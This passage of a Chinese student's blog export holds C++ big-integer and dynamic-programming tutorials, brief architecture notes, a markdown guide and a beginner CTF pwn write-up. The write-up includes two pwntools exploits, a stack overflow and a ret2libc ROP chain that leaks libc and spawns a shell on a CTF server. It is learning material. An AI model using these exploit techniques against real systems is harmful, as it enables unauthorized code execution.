<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全部代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
<h4 id="a-b高精度，a-b高精度"><a href="#a-b高精度，a-b高精度" class="headerlink" title="a-b高精度，a*b高精度"></a>a-b高精度，a*b高精度</h4><p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
<p>实现代码：</p>
<p>减法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>乘法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>基础算法02</title>
    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
<span id="more"></span>

<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png"></p>
<p>具体要求如下：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png"></p>
<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
<p>核心代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ac代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn:从一窍不通到入门的门前</title>
    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
<span id="more"></span>

<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
<p>首先先checksec：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png"></p>
<p>再看伪代码：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png"></p>
<p>再看偏移量：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png"></p>
<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
<p>checksec:</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a520.png"></p>
<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a521.png"></p>
<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
<p>因此要找到system函数，知识点(搬运自wiki)</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
</ul>
<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a522.png"></p>
<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a523.png"></p>
<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机体系结构复习</title>
    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
<span id="more"></span>

<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
<li>原码：二进制形式</li>
<li>反码：原码除符号位不变，其余全部取反</li>
<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
</ul>
<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
]]></content>
      <categories>
        <category>大一课程</category>
      </categories>
      <tags>
        <tag>计算机原理</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown基本语法使用</title>
    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p> 这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
<span id="more"></span>

<h1 id="1-粗体和斜体"><a href="#1-粗体和斜体" class="headerlink" title="1.粗体和斜体"></a>1.粗体和斜体</h1><h1 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>

<p>显示效果：</p>
<ol>
<li><em>这是一段斜体</em></li>
<li><strong>这是一段粗体</strong></li>
<li><em><strong>这是一段加粗斜体</strong></em></li>
<li><del>这是一段删除线</del></li>
</ol>
<h1 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2.分级标题"></a>2.分级标题</h1><p>语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
<h1 id="3-超链接"><a href="#3-超链接" class="headerlink" title="3.超链接"></a>3.超链接</h1><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>

<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>在第一种的基础上可以加上序号方便管理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>

<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p>这种是直接贴出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p><strong>无序列表的表示</strong></p>
<p>使用*，+，- 表示无序列表</p>
<p>语法：</p>
